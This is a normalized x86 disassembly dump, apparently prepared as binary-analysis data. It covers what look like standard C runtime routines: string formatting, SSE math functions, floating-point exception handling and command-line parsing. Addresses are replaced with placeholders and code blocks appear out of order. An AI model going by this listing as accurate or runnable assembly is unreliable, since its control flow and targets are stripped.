mov eax [ esi + 0x20 ]
add [ esi + 0x14 ] 0x8
shr eax 0x4
test al 0x1
mov eax [ esi + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
jmp r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
jmp r-xdata
mov eax ecx
or eax edx
jne r-xdata
mov [ esi + 0x28 ] eax
neg ecx
adc edx 0x0
neg edx
or edi 0x40
mov [ esi + 0x20 ] edi
test ecx ecx
jae r-xdata
push edi
mov edi [ esi + 0x20 ]
mov eax edi
shr eax 0x4
test al 0x1
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp ebx 0x8
jne r-xdata
and [ esi + 0x20 ] 0xffffffdf
push ecx
mov ecx esi
call sub_40eb35
push edx
push ecx
mov ecx esi
call sub_40ebaa
jmp r-xdata
mov al 0x1
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x7
test al 0x1
je r-xdata
dec [ esi + 0x34 ]
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x30
inc [ esi + 0x38 ]
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x30
je r-xdata
sub_41037b
mov edi edi
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
call sub_415a24
test eax eax
jne r-xdata
push [ esi + 0x2c ]
call sub_40fd1b
pop ecx
sub eax 0x1
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
jmp r-xdata
mov al [ esi + 0x18 ]
mov [ edi ] al
sub eax 0x1
je r-xdata
pop edi
pop esi
retn
mov ax [ esi + 0x18 ]
mov [ edi ] ax
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
mov [ esi + 0x30 ] 0x1
mov al 0x1
mov eax [ esi + 0x18 ]
mov [ edi ] eax
jmp r-xdata
sub eax 0x4
jne r-xdata
mov eax [ esi + 0x18 ]
cdq
mov [ edi ] eax
mov [ edi + 0x4 ] edx
jmp r-xdata
sub_410426
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_40ea88
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push edi
push [ esi + 0x34 ]
call sub_414cae
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_414dd5
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop ecx
pop ecx
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_410499
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ esi + 0x28 ]
mov ebx [ eax - 0x4 ]
mov [ esi + 0x34 ] ebx
cmp edi 0xffffffff
jne r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x32 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_40eac8
add esp 0x10
test al al
je r-xdata
mov edi 0x7fffffff
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_41050d
mov [ esi + 0x34 ] r--data
push edi
push [ esi + 0x34 ]
mov [ esi + 0x3c ] 0x1
call sub_414dd5
pop ecx
pop ecx
jmp r-xdata
mov [ esi + 0x34 ] r--data
pop edi
mov [ esi + 0x38 ] eax
mov al 0x1
pop esi
pop ebx
retn
sub_41050d
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
xor esi esi
mov edx [ edi + 0x34 ]
cmp [ ebp + 0x8 ] esi
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
pop ebx
movzx ecx al
mov ebx 0x8000
mov eax [ edi + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
test [ eax + ecx * 2 ] bx
je r-xdata
inc edx
inc esi
cmp esi [ ebp + 0x8 ]
jl r-xdata
inc edx
mov al [ edx ]
test al al
je r-xdata
sub_410590
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov eax [ ecx + 0xc ]
shr eax 0xc
test al 0x1
jne r-xdata
mov al 0x1
push ecx
call sub_413c50
mov edx eax
mov esi rw-data
pop ecx
cmp edx 0xffffffff
je r-xdata
mov eax esi
cmp edx 0xfffffffe
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor al al
jmp r-xdata
cmp edx 0xffffffff
je r-xdata
and eax 0x3f
mov ecx edx
imul eax eax 0x30
sar ecx 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
pop esi
pop ebp
retn
test [ esi + 0x2d ] 0x1
je r-xdata
cmp edx 0xfffffffe
je r-xdata
cmp [ eax + 0x29 ] 0x0
jne r-xdata
mov eax edx
and edx 0x3f
imul esi edx 0x30
sar eax 0x6
add esi [ eax * 4 + rw-data ]
sub_410612
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
push [ ecx ]
movsx eax [ ebp + 0x8 ]
push eax
call sub_4159fb
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
inc [ eax ]
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
jmp r-xdata
pop ebp
retn 0x8
sub_41064f
mov edi edi
push ebp
mov ebp esp
mov edx ecx
mov ecx [ edx ]
mov eax [ ecx + 0x8 ]
cmp eax [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
jne r-xdata
inc [ eax ]
mov eax [ edx ]
inc [ eax + 0x8 ]
mov eax [ edx ]
mov ecx [ eax ]
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
mov eax [ edx ]
add [ eax ] 0x2
mov al 0x1
cmp [ ecx + 0xc ] 0x0
je r-xdata
or [ eax ] 0xffffffff
inc [ eax ]
jmp r-xdata
pop ebp
retn 0x8
mov eax [ edx ]
mov al [ eax + 0xc ]
jmp r-xdata
sub_410694
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_4107c6
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov edi [ esi + 0x34 ]
xor ebx ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
movzx eax [ edi ]
lea edi [ edi + 0x2 ]
and [ ebp - 0x10 ] 0x0
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_414c91
add esp 0x10
test eax eax
jne r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x10 ] eax
je r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
lea ecx [ esi + 0x448 ]
call sub_4107c6
inc ebx
cmp ebx [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_41073b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
cmp [ esi + 0x3c ] 0x0
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push [ esi + 0x38 ]
lea ecx [ esi + 0x448 ]
push [ esi + 0x34 ]
call sub_410850
mov eax [ esi + 0x38 ]
test eax eax
jle r-xdata
mov ebx [ esi + 0x34 ]
xor edi edi
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x4 ] ax
mov eax [ esi + 0x8 ]
push eax
mov eax [ eax ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_414a5c
add esp 0x10
mov [ ebp - 0x8 ] eax
test eax eax
jle r-xdata
or [ esi + 0x18 ] 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x18 ]
push ecx
push [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
call sub_41064f
add ebx [ ebp - 0x8 ]
inc edi
cmp edi [ esi + 0x38 ]
jne r-xdata
jmp r-xdata
sub_4107c6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx ecx
mov eax [ ebx ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
add eax edi
mov [ ebp - 0x4 ] eax
mov ecx [ esi ]
and [ esi ] 0x0
mov [ ebp - 0x8 ] ecx
cmp edi eax
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
pop edi
pop esi
test ecx ecx
je r-xdata
inc edi
cmp edi [ ebp - 0x4 ]
jne r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi ] ecx
push eax
movzx eax [ edi ]
mov ecx ebx
push eax
call sub_410612
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push 0x3f
mov ecx ebx
call sub_410612
mov eax [ ebp + 0x10 ]
sub_410850
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x14 ]
mov eax ecx
push edi
mov [ ebp - 0x8 ] eax
mov ecx [ ebx ]
and [ ebx ] 0x0
mov edx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp [ edx + 0x8 ] edi
jne r-xdata
sub edi [ edx + 0x8 ]
mov eax [ ebp + 0xc ]
cmp edi eax
jb r-xdata
cmp [ edx + 0xc ] 0x0
je r-xdata
push esi
lea esi [ edi + edi ]
push esi
push [ ebp + 0x8 ]
push [ edx ]
call sub_40b8f0
mov ecx [ ebp - 0x8 ]
add esp 0xc
mov eax [ ecx ]
add [ eax ] esi
mov eax [ ecx ]
pop esi
add [ eax + 0x8 ] edi
mov eax [ ecx ]
cmp [ eax + 0xc ] 0x0
mov eax [ ebp + 0x10 ]
je r-xdata
mov edi eax
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
mov ecx [ ebp + 0xc ]
add [ eax ] ecx
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ eax ] edi
or [ eax ] 0xffffffff
jmp r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x10
test ecx ecx
je r-xdata
mov [ ebx ] ecx
sub_4108ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] eax
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edx
call sub_40e7c3
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_410961
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e970
add esp 0x1c
pop ebp
retn
sub_4109b0
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
sub esp 0x8
movq [ esp ] xmm0
call sub_415e0f
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7610
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
addsd xmm4 xmm1
movapd xmm0 xmm4
retn
pextrw eax xmm0 0x3
and ax 0x7fff
pinsrw xmm0 eax 0x3
movlpd xmm1 [ r--data ]
subsd xmm1 xmm0
movapd xmm0 xmm1
retn
sub_410b70
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
sub esp 0x8
movq [ esp ] xmm0
call sub_415f3f
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
pextrw eax xmm0 0x3
and ax 0x7fff
sub ax 0x3030
cmp ax 0x10c5
ja r-xdata
jg r-xdata
movlpd xmm1 [ r--data ]
mulsd xmm1 xmm0
movlpd xmm2 [ r--data ]
cvtsd2si edx xmm1
addsd xmm1 xmm2
movlpd xmm3 [ r--data ]
subsd xmm1 xmm2
movapd xmm2 [ r--data ]
mulsd xmm3 xmm1
unpcklpd xmm1 xmm1
add edx 0x1c7600
movsd xmm4 xmm0
and edx 0x3f
movapd xmm5 [ r--data ]
lea eax [ r--data ]
shl edx 0x5
add eax edx
mulpd xmm2 xmm1
subsd xmm0 xmm3
mulsd xmm1 [ r--data ]
subsd xmm4 xmm3
movlpd xmm7 [ eax + 0x8 ]
unpcklpd xmm0 xmm0
movsd xmm3 xmm4
subsd xmm4 xmm2
mulpd xmm5 xmm0
subpd xmm0 xmm2
movapd xmm6 [ r--data ]
mulsd xmm7 xmm4
subsd xmm3 xmm4
mulpd xmm5 xmm0
mulpd xmm0 xmm0
subsd xmm3 xmm2
movapd xmm2 [ eax ]
subsd xmm1 xmm3
movlpd xmm3 [ eax + 0x18 ]
addsd xmm2 xmm3
subsd xmm7 xmm2
mulsd xmm2 xmm4
mulpd xmm6 xmm0
mulsd xmm3 xmm4
mulpd xmm2 xmm0
mulpd xmm0 xmm0
addpd xmm5 [ r--data ]
mulsd xmm4 [ eax ]
addpd xmm6 [ r--data ]
mulpd xmm5 xmm0
movsd xmm0 xmm3
addsd xmm3 [ eax + 0x8 ]
mulsd xmm1 xmm7
movsd xmm7 xmm4
addsd xmm4 xmm3
addpd xmm6 xmm5
movlpd xmm5 [ eax + 0x8 ]
subsd xmm5 xmm3
subsd xmm3 xmm4
addsd xmm1 [ eax + 0x10 ]
mulpd xmm6 xmm2
addsd xmm5 xmm0
addsd xmm3 xmm7
addsd xmm1 xmm5
addsd xmm1 xmm3
addsd xmm1 xmm6
unpckhpd xmm6 xmm6
addsd xmm1 xmm6
addsd xmm4 xmm1
movapd xmm0 xmm4
retn
shr ax 0x4
cmp ax 0xcfd
jne r-xdata
movlpd xmm3 [ r--data ]
mulsd xmm3 xmm0
subsd xmm3 xmm0
mulsd xmm3 [ r--data ]
retn
mulsd xmm0 [ r--data ]
retn
sub_410d40
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
movq [ esp ] xmm0
call sub_416204
fstp [ esp ]
movq xmm0 [ esp ]
add esp 0x8
retn
fnstcw [ esp ]
movzx eax [ esp ]
and eax 0x7f
cmp eax 0x7f
jne r-xdata
pextrw eax xmm0 0x3
mov ecx eax
and eax 0x7ff0
cmp eax 0x7ff0
je r-xdata
mov eax ecx
and eax 0xf
jne r-xdata
mov eax ecx
and eax 0x8000
jne r-xdata
movq [ esp ] xmm0
or [ esp + 0x6 ] 0x8
mov edx 0x3f5
jmp r-xdata
pextrw eax xmm0 0x2
and eax 0xffff
jne r-xdata
movq [ esp ] xmm0
cmp [ esp ] 0x0
jne r-xdata
sqrtsd xmm0 xmm0
add esp 0x8
retn
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_415fd2
movlpd xmm0 [ esp + 0x10 ]
add esp 0x18
retn
pextrw eax xmm0 0x1
and eax 0xffff
jne r-xdata
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0xfff80000
mov edx 0x31
cmp ecx 0x8000
jne r-xdata
pextrw eax xmm0 0x0
and eax 0xffff
je r-xdata
pextrw eax xmm0 0x2
cmp eax 0x0
jne r-xdata
jmp r-xdata
sub_410e54
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_410e98
mov esi eax
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub_410e98
push 0xc
push r--data
call sub_40b2f0
and [ ebp - 0x1c ] 0x0
push 0x0
call sub_4129a2
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410ee1
mov eax esi
call sub_40b336
retn
sub_410ef5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_413292
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov ecx edx
push ebx
xor ebx ebx
push edi
lea eax [ edx + 0x90 ]
cmp edx eax
je r-xdata
mov ecx ebx
mov edi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
mov edi [ ecx + 0x8 ]
test edi edi
jne r-xdata
test ecx ecx
je r-xdata
add ecx 0xc
cmp ecx eax
jne r-xdata
pop edi
pop ebx
cmp edi 0x5
jne r-xdata
cmp [ ecx ] edi
je r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ecx + 0x8 ] ebx
inc eax
jmp r-xdata
or eax 0xffffffff
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
push [ ecx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx edi
call [ r--data ]
call edi
lea eax [ edx + 0x24 ]
lea edx [ eax + 0x6c ]
jmp r-xdata
cmp eax edx
jne r-xdata
mov [ eax + 0x8 ] ebx
add eax 0xc
mov ebx [ esi + 0x8 ]
mov eax 0xc0000091
cmp [ ecx ] eax
ja r-xdata
cmp [ ecx ] 0xc0000092
je r-xdata
je r-xdata
mov [ esi + 0x8 ] 0x8a
cmp [ ecx ] 0xc0000093
je r-xdata
mov [ esi + 0x8 ] 0x84
jmp r-xdata
cmp [ ecx ] 0xc000008d
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc00002b4
je r-xdata
push [ esi + 0x8 ]
mov ecx edi
push 0x8
call [ r--data ]
call edi
pop ecx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov [ esi + 0x8 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc000008e
je r-xdata
mov [ esi + 0x8 ] 0x8e
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x8 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc000008f
je r-xdata
mov [ esi + 0x8 ] 0x8d
jmp r-xdata
mov [ esi + 0x8 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x8 ] 0x81
jmp r-xdata
sub_4110aa
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
ror esi cl
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
sub_411108
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x2
push esi
je r-xdata
push ebx
push edi
call sub_416c32
push 0x104
mov esi rw-data
xor edi edi
push esi
push edi
call [ GetModuleFileNameA@IAT ]
mov ebx [ rw-data ]
mov [ rw-data ] esi
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
mov ebx esi
cmp [ ebx ] 0x0
jne r-xdata
call sub_4135e3
push 0x16
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push ebx
call sub_41122c
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
call sub_4135e3
push 0xc
pop edi
mov [ eax ] edi
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
push eax
push edi
push edi
push ebx
call sub_41122c
push 0x1
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_4113a1
mov esi eax
add esp 0x20
test esi esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push esi
call sub_41674d
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ rw-data ] eax
mov eax esi
mov esi edi
mov [ rw-data ] eax
mov ebx edi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax edx
cmp [ edx ] edi
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
push esi
call sub_411e2d
pop ecx
pop edi
mov eax ebx
pop ebx
mov eax edi
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] eax
mov ebx edi
mov [ rw-data ] edx
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] edi
jne r-xdata
push eax
call sub_411e2d
pop ecx
mov [ ebp - 0x8 ] edi
sub_41122c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
and [ ebx ] 0x0
mov edi [ ebp + 0x10 ]
mov [ eax ] 0x1
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
xor cl cl
mov [ ebp - 0x1 ] cl
mov [ eax ] edi
add eax 0x4
mov [ ebp + 0xc ] eax
inc [ ebx ]
test edi edi
je r-xdata
test cl cl
mov al 0x22
sete cl
inc esi
mov [ ebp - 0x1 ] cl
jmp r-xdata
mov al [ esi ]
inc esi
mov [ ebp - 0x2 ] al
movsx eax al
push eax
call sub_416fbd
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
test cl cl
jne r-xdata
mov al [ ebp - 0x2 ]
test al al
je r-xdata
inc [ ebx ]
test edi edi
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x20
je r-xdata
dec esi
mov cl [ ebp - 0x1 ]
inc esi
mov al [ esi ]
mov [ edi ] al
inc edi
test edi edi
je r-xdata
cmp al 0x9
jne r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
test ecx ecx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov [ edi - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov esp ebp
pop ebp
retn
and [ ecx ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov [ ecx ] edi
add ecx 0x4
mov [ ebp + 0xc ] ecx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc eax
cmp [ esi ] 0x22
jne r-xdata
test eax eax
jne r-xdata
test al 0x1
jne r-xdata
dec eax
test edi edi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
shr eax 0x1
jmp r-xdata
mov cl [ ebp - 0x1 ]
test cl cl
je r-xdata
inc [ ebx ]
mov [ edi ] 0x5c
inc edi
test edi edi
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor edx edx
test cl cl
sete [ ebp - 0x1 ]
lea ecx [ esi + 0x1 ]
cmp [ ecx ] 0x22
jne r-xdata
inc [ ebx ]
jmp r-xdata
mov [ edi ] 0x0
inc edi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov cl [ ebp - 0x1 ]
mov esi ecx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
xor edx edx
inc edx
xor eax eax
jmp r-xdata
movsx eax [ esi ]
push eax
call sub_416fbd
pop ecx
test eax eax
je r-xdata
mov [ edi ] al
inc edi
inc [ ebx ]
inc esi
inc [ ebx ]
test edi edi
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
sub_4113a1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x3fffffff
jb r-xdata
push edi
or edi 0xffffffff
mov ecx [ ebp + 0xc ]
xor edx edx
mov eax edi
div [ ebp + 0x10 ]
cmp ecx eax
jae r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
